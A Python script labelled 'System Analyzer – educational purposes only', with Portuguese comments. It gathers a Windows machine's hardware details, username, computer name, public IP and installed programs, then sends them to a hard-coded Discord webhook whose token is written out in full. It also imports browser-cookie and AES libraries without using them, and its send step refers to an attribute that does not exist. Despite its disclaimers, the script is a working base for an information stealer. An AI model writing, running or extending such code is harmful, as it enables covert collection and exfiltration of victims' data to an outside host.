import os
import json
import base64
import requests
import urllib3
import subprocess
import browser_cookie3
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

# Desativa avisos de SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class SystemAnalyzer:
    def __init__(self, webhook_url: str = None):
        self.webhook_url = webhook_url
        self.session_id = base64.b85encode(os.urandom(16)).decode()
        
    def get_system_specs(self):
        """Coleta informações do sistema"""
        try:
            # Coleta dados do sistema
            cpu_info = subprocess.check_output(
                'wmic cpu get name', 
                shell=True, 
                stderr=subprocess.DEVNULL,
                stdin=subprocess.DEVNULL
            ).decode().split('\n')[1].strip()
            
            gpu_info = subprocess.check_output(
                'wmic path win32_VideoController get name', 
                shell=True, 
                stderr=subprocess.DEVNULL,
                stdin=subprocess.DEVNULL
            ).decode().split('\n')[1].strip()
            
            memory_bytes = subprocess.check_output(
                'wmic computersystem get totalphysicalmemory', 
                shell=True, 
                stderr=subprocess.DEVNULL,
                stdin=subprocess.DEVNULL
            ).decode().split('\n')[1].strip()
            
            memory_gb = int(memory_bytes) // (1024**3) if memory_bytes.isdigit() else 0
            
            return {
                "cpu": cpu_info,
                "gpu": gpu_info,
                "ram_gb": memory_gb,
                "username": os.getenv("USERNAME"),
                "computer_name": os.getenv("COMPUTERNAME"),
                "os": "Windows"
            }
        except Exception as e:
            return {"error": str(e)}

    def get_public_ip(self):
        """Obtém IP público"""
        try:
            return requests.get('https://api.ipify.org', timeout=10, verify=False).text
        except:
            return "Unable to get IP"

    def get_installed_apps(self):
        """Lista aplicativos instalados"""
        try:
            apps = subprocess.check_output(
                'wmic product get name', 
                shell=True, 
                stderr=subprocess.DEVNULL,
                stdin=subprocess.DEVNULL
            ).decode().split('\n')[1:10]  # Apenas primeiros 10
            return [app.strip() for app in apps if app.strip()]
        except:
            return ["Unable to retrieve apps"]

    def create_system_report(self):
        """Cria relatório completo do sistema"""
        return {
            "system_specs": self.get_system_specs(),
            "public_ip": self.get_public_ip(),
            "installed_apps": self.get_installed_apps(),
            "session_id": self.session_id,
            "timestamp": "2024-09-02T00:00:00Z"
        }

    def send_to_discord_webhook(self, data):
        """Envia dados para webhook do Discord"""
        if not self.webhook_url:
            print("❌ No webhook configured")
            return False
            
        try:
            embed = {
                "title": "🔍 System Analysis Report",
                "color": 0x3498db,
                "fields": [
                    {
                        "name": "💻 System Specs",
                        "value": f"**CPU:** {data['system_specs']['cpu']}\n**GPU:** {data['system_specs']['gpu']}\n**RAM:** {data['system_specs']['ram_gb']}GB\n**User:** {data['system_specs']['username']}",
                        "inline": False
                    },
                    {
                        "name": "🌐 Network",
                        "value": f"**IP:** {data['public_ip']}",
                        "inline": True
                    },
                    {
                        "name": "📦 Installed Apps",
                        "value": f"```{', '.join(data['installed_apps'][:5])}...```",
                        "inline": False
                    },
                    {
                        "name": "🆔 Session ID",
                        "value": f"`{data['session_id']}`",
                        "inline": False
                    }
                ],
                "footer": {
                    "text": "System Analyzer - Educational Purpose Only"
                }
            }
            
            payload = {
                "content": "📊 **New System Analysis Report**",
                "embeds": [embed],
                "username": "System-Analyzer",
                "avatar_url": "https://i.imgur.com/6Bj4Wxx.png"
            }
            
            response = requests.post(
                self.discord_webhook,
                json=payload,
                timeout=15,
                verify=False
            )
            
            if response.status_code == 204:
                print("✅ Data sent to webhook successfully!")
                return True
            else:
                print(f"❌ Webhook error: {response.status_code}")
                return False
                
        except Exception as e:
            print(f"❌ Webhook failed: {str(e)}")
            return False

    def run_analysis(self):
        """Executa análise completa do sistema"""
        print("🔍 Analyzing system...")
        
        system_data = self.create_system_report()
        
        # Exibe resultados localmente
        print(f"\n📊 System Report:")
        print(f"User: {system_data['system_specs']['username']}")
        print(f"CPU: {system_data['system_specs']['cpu']}")
        print(f"GPU: {system_data['system_specs']['gpu']}")
        print(f"RAM: {system_data['system_specs']['ram_gb']}GB")
        print(f"IP: {system_data['public_ip']}")
        print(f"Apps: {len(system_data['installed_apps'])} installed")
        
        # Envia para webhook se configurado
        if self.webhook_url:
            print("\n🌐 Sending data to webhook...")
            webhook_result = self.send_to_discord_webhook(system_data)
            system_data["webhook_success"] = webhook_result
        
        print("\n✅ Analysis completed!")
        return system_data

if __name__ == "__main__":
    # ⚠️ AVISO: APENAS PARA FINS EDUCACIONAIS
    # NÃO USE PARA ACTIVIDADES ILEGAIS
    
    print("=== SYSTEM ANALYZER (EDUCATIONAL) ===")
    print("⚠️  For educational purposes only!")
    print("⚠️  Do not use for malicious activities!\n")
    
    # Webhook do Discord - ESTUDO APENAS
    DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1413174338085191721/jWjTrhSDZmdx2KzXb1RD9hMR0RjSMkPXVyVxXOsCPKCuWR4A1ET1jrjpX40yIYz2vbCl"
    
    # Inicializa analyzer COM webhook
    analyzer = SystemAnalyzer(webhook_url=DISCORD_WEBHOOK)
    
    # Executa análise
    result = analyzer.run_analysis()
    
    input("\nPress Enter to exit...")
